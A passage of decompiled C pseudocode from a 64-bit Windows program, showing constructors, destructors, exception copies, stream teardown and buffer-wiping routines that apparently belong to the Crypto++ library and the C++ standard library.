  v7 = v6 + 32;
  *(_QWORD *)(v7 + 24) = 15i64;
  *(_QWORD *)(v7 + 16) = 0i64;
  *(_BYTE *)v7 = 0;
  sub_140004DF0((void *)(v6 + 32), &v9, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v6 = &off_1400A8798;
  if ( v11 >= 0x10 )
    operator delete(v9);
  *(_QWORD *)v6 = &off_1400A8798;
  *(_QWORD *)(v6 + 64) = v5;
  *(_QWORD *)(v6 + 72) = v4;
  return v6;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140023920) ----------------------------------------------------
__int64 __fastcall sub_140023920(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  __int64 v4; // rsi
  void (__fastcall ***v5)(_QWORD, signed __int64); // rcx

  v2 = a2;
  v3 = a1;
  *(_QWORD *)a1 = &off_1400A66F8;
  *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
  *(_BYTE *)(a1 + 16) = *(_BYTE *)(a2 + 16);
  *(_BYTE *)(a1 + 17) = *(_BYTE *)(a2 + 17);
  *(_QWORD *)(a1 + 24) = 0i64;
  v4 = *(_QWORD *)(a2 + 24);
  *(_QWORD *)(a2 + 24) = 0i64;
  v5 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 24);
  if ( v5 )
    (**v5)(v5, 1i64);
  *(_QWORD *)(v3 + 24) = v4;
  *(_BYTE *)(v2 + 17) = 1;
  return v3;
}
// 1400A66F8: using guessed type __int64 (__fastcall *off_1400A66F8)(void *);

//----- (00000001400239A0) ----------------------------------------------------
std::exception *__fastcall sub_1400239A0(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140023A20) ----------------------------------------------------
_DWORD *__fastcall sub_140023A20(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 6;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140023AF0) ----------------------------------------------------
std::exception *__fastcall sub_140023AF0(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140023B70) ----------------------------------------------------
std::exception *__fastcall sub_140023B70(std::exception *a1)
{
  std::exception *v1; // rbx
  _QWORD *v2; // rax
  void *Src; // [rsp+28h] [rbp-30h]
  unsigned __int64 v5; // [rsp+40h] [rbp-18h]

  v1 = a1;
  v2 = sub_140027260(&Src);
  sub_1400236E0(v1, v2);
  if ( v5 >= 0x10 )
    operator delete(Src);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140023BE0) ----------------------------------------------------
void __fastcall sub_140023BE0(__int64 a1)
{
  signed __int64 v1; // rbx
  void (__fastcall ***v2)(_QWORD, signed __int64); // rcx
  void *v3; // rdx

  v1 = a1 + 8;
  sub_140023D40(a1 + 96);
  v2 = *(void (__fastcall ****)(_QWORD, signed __int64))(v1 + 80);
  if ( v2 )
    (**v2)(v2, 1i64);
  v3 = *(void **)(v1 + 56);
  memset(*(void **)(v1 + 56), 0, 8i64 * *(_QWORD *)(v1 + 48));
  free(v3);
}

//----- (0000000140023C40) ----------------------------------------------------
__int64 __fastcall sub_140023C40(__int64 a1)
{
  void *v1; // rdi
  unsigned __int64 v2; // rdx
  __int64 result; // rax

  v1 = *(void **)(a1 + 32);
  v2 = *(_QWORD *)(a1 + 24);
  if ( v1 == (void *)a1 )
  {
    *(_BYTE *)(a1 + 17) = 0;
    result = 0i64;
    memset(v1, 0, v2);
  }
  return result;
}

//----- (0000000140023C70) ----------------------------------------------------
__int64 __fastcall sub_140023C70(__int64 a1)
{
  void *v1; // rdi
  unsigned __int64 v2; // rdx
  __int64 result; // rax

  v1 = *(void **)(a1 + 48);
  v2 = *(_QWORD *)(a1 + 40);
  if ( v1 == (void *)a1 )
  {
    *(_BYTE *)(a1 + 33) = 0;
    result = 0i64;
    memset(v1, 0, v2);
  }
  return result;
}

//----- (0000000140023CA0) ----------------------------------------------------
void __fastcall sub_140023CA0(__int64 a1)
{
  void *v1; // rdx

  v1 = *(void **)(a1 + 16);
  memset(v1, 0, 8i64 * *(_QWORD *)(a1 + 8));
  free(v1);
}

//----- (0000000140023CD0) ----------------------------------------------------
__int64 __fastcall sub_140023CD0(__int64 a1)
{
  bool v1; // zf
  __int64 v2; // rbx

  v1 = (*(_BYTE *)(a1 + 112) & 1) == 0;
  v2 = a1;
  *(_QWORD *)a1 = &off_1400A6430;
  if ( !v1 )
    operator delete(**(void ***)(a1 + 24));
  **(_QWORD **)(v2 + 24) = 0i64;
  **(_QWORD **)(v2 + 56) = 0i64;
  **(_DWORD **)(v2 + 80) = 0;
  **(_QWORD **)(v2 + 32) = 0i64;
  **(_QWORD **)(v2 + 64) = 0i64;
  **(_DWORD **)(v2 + 88) = 0;
  *(_DWORD *)(v2 + 112) &= 0xFFFFFFFE;
  *(_QWORD *)(v2 + 104) = 0i64;
  return std::basic_streambuf<char,std::char_traits<char>>::~basic_streambuf<char,std::char_traits<char>>(v2);
}
// 1400A16B0: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::~basic_streambuf<char,std::char_traits<char>>(_QWORD);
// 1400A6430: using guessed type __int64 (__fastcall *off_1400A6430)(void *);

//----- (0000000140023D40) ----------------------------------------------------
void __fastcall sub_140023D40(__int64 a1)
{
  __int64 v1; // rbx
  void (__fastcall ***v2)(_QWORD, _QWORD); // rdi
  void (__fastcall ***i)(_QWORD, _QWORD); // rsi
  void *v4; // rdx
  void *v5; // rdx

  v1 = a1;
  v2 = *(void (__fastcall ****)(_QWORD, _QWORD))(a1 + 96);
  if ( v2 )
  {
    for ( i = *(void (__fastcall ****)(_QWORD, _QWORD))(a1 + 104); v2 != i; v2 += 5 )
      (**v2)(v2, 0i64);
    operator delete(*(void **)(v1 + 96));
    *(_QWORD *)(v1 + 96) = 0i64;
    *(_QWORD *)(v1 + 104) = 0i64;
    *(_QWORD *)(v1 + 112) = 0i64;
  }
  v4 = *(void **)(v1 + 80);
  memset(*(void **)(v1 + 80), 0, 8i64 * *(_QWORD *)(v1 + 72));
  free(v4);
  v5 = *(void **)(v1 + 32);
  memset(*(void **)(v1 + 32), 0, 8i64 * *(_QWORD *)(v1 + 24));
  free(v5);
}

//----- (0000000140023DE0) ----------------------------------------------------
__int64 __fastcall sub_140023DE0(volatile signed __int32 ***a1)
{
  volatile signed __int32 ***v1; // rbx
  __int64 result; // rax

  v1 = a1;
  if ( *a1 )
  {
    sub_140029680((__int64)a1, *a1, a1[1]);
    operator delete(*v1);
    result = 0i64;
    *v1 = 0i64;
    v1[1] = 0i64;
    v1[2] = 0i64;
  }
  return result;
}

//----- (0000000140023E20) ----------------------------------------------------
__int64 __fastcall sub_140023E20(__int64 a1)
{
  void (__fastcall ***v1)(_QWORD, _QWORD); // rbx
  __int64 v2; // rdi
  void (__fastcall ***i)(_QWORD, _QWORD); // rsi
  __int64 result; // rax

  v1 = *(void (__fastcall ****)(_QWORD, _QWORD))a1;
  v2 = a1;
  if ( *(_QWORD *)a1 )
  {
    for ( i = *(void (__fastcall ****)(_QWORD, _QWORD))(a1 + 8); v1 != i; v1 += 5 )
      (**v1)(v1, 0i64);
    operator delete(*(void **)v2);
    result = 0i64;
    *(_QWORD *)v2 = 0i64;
    *(_QWORD *)(v2 + 8) = 0i64;
    *(_QWORD *)(v2 + 16) = 0i64;
  }
  return result;
}

//----- (0000000140023F90) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_140023F90(__int64 a1))()
{
  __int64 v1; // rdi
  __int64 (__fastcall **result)(); // rax

  v1 = a1;
  sub_1400298B0((void ***)(a1 + 8));
  operator delete(*(void **)(v1 + 8));
  result = &off_1400A2D20;
  *(_QWORD *)v1 = &off_1400A2D20;
  return result;
}
// 1400A2D20: using guessed type __int64 (__fastcall *off_1400A2D20)();

//----- (0000000140023FE0) ----------------------------------------------------
__int64 __fastcall sub_140023FE0(__int64 a1)
{
  __int64 (__fastcall ***v1)(_QWORD, signed __int64); // rcx
  __int64 result; // rax

  v1 = *(__int64 (__fastcall ****)(_QWORD, signed __int64))(a1 + 8);
  if ( v1 )
    result = (**v1)(v1, 1i64);
  return result;
}

//----- (0000000140024000) ----------------------------------------------------
void __fastcall sub_140024000(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rdx
  void *v3; // rdx
  void *v4; // rdx

  v1 = a1;
  v2 = *(void **)(a1 + 128);
  memset(*(void **)(a1 + 128), 0, 8i64 * *(_QWORD *)(a1 + 120));
  free(v2);
  v3 = *(void **)(v1 + 88);
  memset(*(void **)(v1 + 88), 0, 8i64 * *(_QWORD *)(v1 + 80));
  free(v3);
  v4 = *(void **)(v1 + 48);
  memset(*(void **)(v1 + 48), 0, 8i64 * *(_QWORD *)(v1 + 40));
  free(v4);
}

//----- (0000000140024080) ----------------------------------------------------
void __fastcall sub_140024080(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rdx
  void *v3; // rdx

  v1 = a1;
  v2 = *(void **)(a1 + 200);
  memset(*(void **)(a1 + 200), 0, 8i64 * *(_QWORD *)(a1 + 192));
  free(v2);
  v3 = *(void **)(v1 + 168);
  memset(*(void **)(v1 + 168), 0, 8i64 * *(_QWORD *)(v1 + 160));
  free(v3);
  sub_140024000(v1);
}

//----- (00000001400240F0) ----------------------------------------------------
signed __int64 __fastcall sub_1400240F0(__int64 a1)
{
  __int64 v1; // rbx
  void (__fastcall ***v2)(_QWORD, signed __int64); // rcx
  signed __int64 result; // rax
  unsigned __int64 v4; // rcx
  void *v5; // rdi
  signed __int64 v6; // rbx
  unsigned __int64 v7; // rcx
  void *v8; // rdi

  v1 = a1;
  v2 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 104);
  if ( v2 )
    (**v2)(v2, 1i64);
  result = v1 + 64;
  v4 = *(_QWORD *)(v1 + 88);
  v5 = *(void **)(v1 + 96);
  if ( v5 == (void *)(v1 + 64) )
  {
    *(_BYTE *)(v1 + 81) = 0;
    result = 0i64;
    memset(v5, 0, v4);
  }
  v6 = v1 + 8;
  v7 = *(_QWORD *)(v6 + 40);
  v8 = *(void **)(v6 + 48);
  if ( v8 == (void *)v6 )
  {
    *(_BYTE *)(v6 + 33) = 0;
    result = 0i64;
    memset(v8, 0, v7);
  }
  return result;
}

//----- (0000000140024160) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_140024160(__int64 a1))()
{
  __int64 v1; // rdi
  volatile signed __int32 *v2; // rbx
  volatile signed __int32 **v3; // rdx
  __int64 (__fastcall **result)(); // rax

  v1 = a1;
  _Mtx_destroy(a1 + 64);
  v2 = *(volatile signed __int32 **)(v1 + 40);
  if ( v2 )
  {
    if ( !_InterlockedDecrement(v2 + 2) )
    {
      (**(void (__fastcall ***)(volatile signed __int32 *))v2)(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
    }
  }
  v3 = *(volatile signed __int32 ***)(v1 + 8);
  if ( v3 )
  {
    sub_140029680(v1 + 8, v3, *(volatile signed __int32 ***)(v1 + 16));
    operator delete(*(void **)(v1 + 8));
    *(_QWORD *)(v1 + 8) = 0i64;
    *(_QWORD *)(v1 + 16) = 0i64;
    *(_QWORD *)(v1 + 24) = 0i64;
  }
  result = &off_1400A56B0;
  *(_QWORD *)v1 = &off_1400A56B0;
  return result;
}
// 1400A1628: using guessed type __int64 __fastcall _Mtx_destroy(_QWORD);
// 1400A56B0: using guessed type __int64 (__fastcall *off_1400A56B0)();

//----- (0000000140024220) ----------------------------------------------------
char __fastcall sub_140024220(_QWORD *a1)
{
  _QWORD *v1; // rbx
  char result; // al
  __int64 v3; // rdx
  __int64 (__fastcall ***v4)(_QWORD, signed __int64); // rcx
  char v5; // [rsp+30h] [rbp-58h]

  v1 = a1;
  *a1 = &off_1400A66F8;
  result = std::uncaught_exception();
  if ( !result && *((_BYTE *)v1 + 16) && !*((_BYTE *)v1 + 17) )
  {
    v3 = v1[1];
    sub_140023A20(&v5);
    CxxThrowException(&v5, &_TI3_AVcls_060_cls_059_CryptoPP__);
  }
  v4 = (__int64 (__fastcall ***)(_QWORD, signed __int64))v1[3];
  if ( v4 )
    result = (**v4)(v4, 1i64);
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1608: using guessed type bool std::uncaught_exception(void);
// 1400A66F8: using guessed type __int64 (__fastcall *off_1400A66F8)(void *);
// 1400D3C70: using guessed type int _TI3_AVcls_060_cls_059_CryptoPP__;

//----- (00000001400242B0) ----------------------------------------------------
void __fastcall sub_1400242B0(void *a1)
{
  void *v1; // rdx

  v1 = (void *)*((_QWORD *)a1 + 3);
  memset(v1, 0, 8i64 * *((_QWORD *)a1 + 2));
  free(v1);
}

//----- (00000001400242E0) ----------------------------------------------------
void __fastcall sub_1400242E0(__int64 a1)
{
  void *v1; // rdx

  v1 = *(void **)(a1 + 56);
  memset(v1, 0, 8i64 * *(_QWORD *)(a1 + 48));
  free(v1);
}

//----- (0000000140024310) ----------------------------------------------------
__int64 __fastcall sub_140024310(__int64 **a1)
{
  __int64 **v1; // rbx
  __int64 result; // rax
  __int64 v3; // rcx

  v1 = a1;
  if ( !std::uncaught_exception() )
    std::basic_ostream<char,std::char_traits<char>>::_Osfx(*v1);
  result = **v1;
  v3 = *(__int64 *)((char *)*v1 + *(signed int *)(result + 4) + 72);
  if ( v3 )
    result = (*(__int64 (**)(void))(*(_QWORD *)v3 + 16i64))();
  return result;
}
// 1400A15E8: using guessed type __int64 __fastcall std::basic_ostream<char,std::char_traits<char>>::_Osfx(_QWORD);
// 1400A1608: using guessed type bool std::uncaught_exception(void);

//----- (0000000140024360) ----------------------------------------------------
__int64 __fastcall sub_140024360(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  signed __int64 v4; // rax
  __int64 v5; // rcx

  v2 = a2;
  v3 = a1;
  if ( a2 )
    v4 = a2 + 8;
  else
    v4 = 0i64;
  v5 = a1 + 32;
  *(_DWORD *)(v5 - 8) = *(_DWORD *)(v4 + 16);
  sub_14003C670(v5, a2 + 32);
  sub_1400243F0((_QWORD *)(v3 + 80), (__int64 *)(v2 + 80));
  sub_14003C670(v3 + 96, v2 + 96);
  *(_DWORD *)(v3 + 136) = *(_DWORD *)(v2 + 136);
  sub_14003C670(v3 + 144, v2 + 144);
  sub_140024470((__int64 *)(v3 + 184), (__int64 *)(v2 + 184));
  return v3;
}

//----- (00000001400243F0) ----------------------------------------------------
_QWORD *__fastcall sub_1400243F0(_QWORD *a1, __int64 *a2)
{
  __int64 *v2; // rsi
  _QWORD *v3; // rbx
  void (__fastcall ***v4)(_QWORD, signed __int64); // rdi
  _QWORD *v5; // rax

  v2 = a2;
  v3 = a1;
  v4 = (void (__fastcall ***)(_QWORD, signed __int64))*a1;
  if ( *a2 )
  {
    v5 = operator new(0xD0ui64);
    if ( v5 )
      v5 = sub_140023480(v5, *v2);
  }
  else
  {
    v5 = 0i64;
  }
  *v3 = v5;
  if ( v4 )
    (**v4)(v4, 1i64);
  return v3;
}

//----- (0000000140024470) ----------------------------------------------------
__int64 *__fastcall sub_140024470(__int64 *a1, __int64 *a2)
{
  __int64 *v2; // rsi
  __int64 *v3; // rdi
  __int64 v4; // r10
  __int64 v5; // r11
  unsigned __int64 v6; // rbx
  __int64 v7; // r9
  unsigned __int64 v8; // r8
  void (__fastcall ***v9)(_QWORD, _QWORD); // rbx
  void (__fastcall ***i)(_QWORD, _QWORD); // r14
  __int64 v11; // rbx

  v2 = a2;
  v3 = a1;
  if ( a1 != a2 )
  {
    v4 = *a2;
    v5 = a2[1];
    if ( *a2 == v5 )
    {
      sub_140029930(a1);
    }
    else
    {
      v6 = ((unsigned __int64)((unsigned __int128)((v5 - v4) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
         + ((signed __int64)((unsigned __int128)((v5 - v4) * (signed __int128)7378697629483820647i64) >> 64) >> 4);
      v7 = *a1;
      v8 = ((unsigned __int64)((unsigned __int128)((a1[1] - *a1) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
         + ((signed __int64)((unsigned __int128)((a1[1] - *a1) * (signed __int128)7378697629483820647i64) >> 64) >> 4);
      if ( v6 > v8 )
      {
        if ( v6 > ((unsigned __int64)((unsigned __int128)((a1[2] - v7) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
                + ((signed __int64)((unsigned __int128)((a1[2] - v7) * (signed __int128)7378697629483820647i64) >> 64) >> 4) )
        {
          if ( v7 )
          {
            sub_1400296F0(
              (__int64)a1,
              (__int64 (__fastcall ***)(_QWORD, _QWORD))*a1,
              (__int64 (__fastcall ***)(_QWORD, _QWORD))a1[1]);
            operator delete((void *)*v3);
          }
          if ( sub_140029590(
                 v3,
                 ((unsigned __int64)((unsigned __int128)((v2[1] - *v2) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
               + ((signed __int64)((unsigned __int128)((v2[1] - *v2) * (signed __int128)7378697629483820647i64) >> 64) >> 4)) )
          {
            v3[1] = sub_140022D20(*v2, v2[1], *v3);
          }
        }
        else
        {
          v11 = v4 + 40 * v8;
          sub_140022C60(v4, v11, *a1);
          v3[1] = sub_140022D20(v11, v2[1], v3[1]);
        }
      }
      else
      {
        v9 = (void (__fastcall ***)(_QWORD, _QWORD))sub_140022C60(v4, v5, *a1);
        for ( i = (void (__fastcall ***)(_QWORD, _QWORD))v3[1]; v9 != i; v9 += 5 )
          (**v9)(v9, 0i64);
        v3[1] = *v3
              + 40
              * (((unsigned __int64)((unsigned __int128)((v2[1] - *v2) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
               + ((signed __int64)((unsigned __int128)((v2[1] - *v2) * (signed __int128)7378697629483820647i64) >> 64) >> 4));
      }
    }
  }
  return v3;
}

//----- (0000000140024640) ----------------------------------------------------
__int64 __fastcall sub_140024640(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rdi
  __int64 v4; // rbx
  __int64 v5; // rax
  __int64 v6; // rax
  void *v7; // rdx
  char v9; // [rsp+30h] [rbp-38h]
  __int64 v10; // [rsp+40h] [rbp-28h]
  void *Memory; // [rsp+48h] [rbp-20h]

  v3 = a3;
  v4 = a2;
  v5 = sub_14003C000((__int64)&v9, a1);
  v6 = sub_14003D760(v5, v3);
  sub_14003C000(v4, v6);
  v7 = Memory;
  memset(Memory, 0, 8 * v10);
  free(v7);
  return v4;
}

//----- (00000001400246C0) ----------------------------------------------------
bool __fastcall sub_1400246C0(__int64 a1, __int64 a2)
{
  return (unsigned int)sub_140045A60(a1, a2) == 0;
}

//----- (00000001400246E0) ----------------------------------------------------
__int64 __fastcall sub_1400246E0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a1;
  sub_14004C040(a2, a1);
  return v2;
}
// 14004C040: using guessed type __int64 __fastcall sub_14004C040(_QWORD, _QWORD);

//----- (0000000140024710) ----------------------------------------------------
__int64 __fastcall sub_140024710(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx

  v3 = a1;
  sub_1400490B0(a2, a1, a3);
  return v3;
}

//----- (0000000140024740) ----------------------------------------------------
__int64 __fastcall sub_140024740(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a1;
  sub_140049E50(a2, a1);
  return v2;
}
// 140049E50: using guessed type __int64 __fastcall sub_140049E50(_QWORD, _QWORD);

//----- (0000000140024770) ----------------------------------------------------
__int64 __fastcall sub_140024770(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx

  v3 = a1;
  sub_140046CF0(a2, a1, a3);
  return v3;
}

//----- (00000001400247A0) ----------------------------------------------------
void *__fastcall sub_1400247A0(void *a1, __int64 a2, unsigned __int64 a3)
{
  void *v3; // rbx

  v3 = a1;
  sub_140046E00(a2, a1, a3);
  return v3;
}

//----- (00000001400247D0) ----------------------------------------------------
__int64 __fastcall sub_1400247D0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a1;
  sub_1400491C0(a2, a1);
  return v2;
}
// 1400491C0: using guessed type __int64 __fastcall sub_1400491C0(_QWORD, _QWORD);

//----- (0000000140024800) ----------------------------------------------------
void __fastcall sub_140024800(__int64 a1)
{
  struct std::ios_base *v1; // rbx

  v1 = (struct std::ios_base *)(a1 + 152);
  *(_QWORD *)((char *)v1 + *(signed int *)(*(_QWORD *)a1 + 4i64) - 152) = &off_1400A6BA8;
  *(_DWORD *)((char *)v1 + *(signed int *)(*(_QWORD *)a1 + 4i64) - 156) = *(_DWORD *)(*(_QWORD *)a1 + 4i64) - 152;
  sub_140023CD0(a1 + 24);
  std::basic_iostream<char,std::char_traits<char>>::~basic_iostream<char,std::char_traits<char>>((char *)v1 - 120);
  *(_QWORD *)v1 = std::basic_ios<char,std::char_traits<char>>::`vftable';
  *(_QWORD *)v1 = std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 1400A15C8: using guessed type __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::~basic_iostream<char,std::char_traits<char>>(_QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400A1640: using guessed type void *std::ios_base::`vftable';
// 1400A16C0: using guessed type void __stdcall static std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 1400A6BA8: using guessed type __int64 (__fastcall *off_1400A6BA8)();

//----- (0000000140024880) ----------------------------------------------------
void __fastcall sub_140024880(__int64 a1)
{
  __int64 v1; // rbx
  void (__fastcall ***v2)(_QWORD, signed __int64); // rcx
  void *v3; // rdx

  v1 = a1;
  sub_140023D40(a1 + 88);
  v2 = *(void (__fastcall ****)(_QWORD, signed __int64))(v1 + 80);
  if ( v2 )
    (**v2)(v2, 1i64);
  v3 = *(void **)(v1 + 56);
  memset(*(void **)(v1 + 56), 0, 8i64 * *(_QWORD *)(v1 + 48));
  free(v3);
}

//----- (00000001400248DC) ----------------------------------------------------
void *__fastcall sub_1400248DC(__int64 a1, char a2)
{
  return sub_1400249C0((void *)(a1 - *(signed int *)(a1 - 4) - 216), a2);
}

//----- (00000001400248F0) ----------------------------------------------------
void *__fastcall sub_1400248F0(__int64 a1, char a2)
{
  return sub_140024AA0(a1 - *(signed int *)(a1 - 4), a2);
}

//----- (00000001400248FC) ----------------------------------------------------
void *__fastcall sub_1400248FC(__int64 a1, char a2)
{
  return sub_140024B10((void *)(a1 - *(signed int *)(a1 - 4) - 216), a2);
}

//----- (0000000140024910) ----------------------------------------------------
void *__fastcall sub_140024910(__int64 a1, char a2)
{
  return sub_140024CA0((void *)(a1 - *(signed int *)(a1 - 4) - 216), a2);
}

//----- (0000000140024930) ----------------------------------------------------
void *__fastcall sub_140024930(void *a1, char a2)
{
  char v2; // bp
  void *v3; // rbx
  char *v4; // rsi
  void (__fastcall ***v5)(_QWORD, signed __int64); // rcx
  void *v6; // rdx

  v2 = a2;
  v3 = a1;
  v4 = (char *)a1 + 8;
  sub_140023D40((__int64)a1 + 96);
  v5 = (void (__fastcall ***)(_QWORD, signed __int64))*((_QWORD *)v4 + 10);
  if ( v5 )
    (**v5)(v5, 1i64);
  v6 = (void *)*((_QWORD *)v4 + 7);
  memset(*((void **)v4 + 7), 0, 8i64 * *((_QWORD *)v4 + 6));
  free(v6);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (00000001400249C0) ----------------------------------------------------
void *__fastcall sub_1400249C0(void *a1, char a2)
{
  char v2; // si
  void *v3; // rbx
  void (__fastcall ***v4)(_QWORD, signed __int64); // rcx
  void *v5; // rdx

  v2 = a2;
  v3 = a1;
  sub_140023D40((__int64)a1 + 88);
  v4 = (void (__fastcall ***)(_QWORD, signed __int64))*((_QWORD *)v3 + 10);
  if ( v4 )
    (**v4)(v4, 1i64);
  v5 = (void *)*((_QWORD *)v3 + 7);
  memset(*((void **)v3 + 7), 0, 8i64 * *((_QWORD *)v3 + 6));
  free(v5);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140024A40) ----------------------------------------------------
_QWORD *__fastcall sub_140024A40(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = &off_1400A6410;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}
// 1400A6410: using guessed type void *off_1400A6410;

//----- (0000000140024A70) ----------------------------------------------------
void *__fastcall sub_140024A70(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140023CD0((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140024AA0) ----------------------------------------------------
void *__fastcall sub_140024AA0(__int64 a1, char a2)
{
  void *v2; // rdi
  char v3; // bl

  v2 = (void *)(a1 - 152);
  v3 = a2;
  sub_140024800(a1 - 152);
  if ( v3 & 1 )
    operator delete(v2);
  return v2;
}

//----- (0000000140024AE0) ----------------------------------------------------
void *__fastcall sub_140024AE0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140024220(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140024B10) ----------------------------------------------------
void *__fastcall sub_140024B10(void *a1, char a2)
{
  char v2; // si
  void *v3; // rbx
  void (__fastcall ***v4)(_QWORD, signed __int64); // rcx
  void *v5; // rdx

  v2 = a2;
  v3 = a1;
  sub_140023D40((__int64)a1 + 88);
  v4 = (void (__fastcall ***)(_QWORD, signed __int64))*((_QWORD *)v3 + 10);
  if ( v4 )
    (**v4)(v4, 1i64);
  v5 = (void *)*((_QWORD *)v3 + 7);
  memset(*((void **)v3 + 7), 0, 8i64 * *((_QWORD *)v3 + 6));
  free(v5);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140024B90) ----------------------------------------------------
void *__fastcall sub_140024B90(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140023E90();
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 140023E90: using guessed type __int64 sub_140023E90(void);

//----- (0000000140024BC0) ----------------------------------------------------
void *__fastcall sub_140024BC0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140024000((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140024BF0) ----------------------------------------------------
void *__fastcall sub_140024BF0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140024080((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140024C20) ----------------------------------------------------
void *__fastcall sub_140024C20(void *a1, char a2)
{
  char v2; // di
  void *v3; // rbx

  v2 = a2;
  v3 = a1;
  if ( *((_QWORD *)a1 + 8) >= 0x10ui64 )
    operator delete(*((void **)a1 + 5));
  *((_QWORD *)v3 + 8) = 15i64;
  *((_QWORD *)v3 + 7) = 0i64;
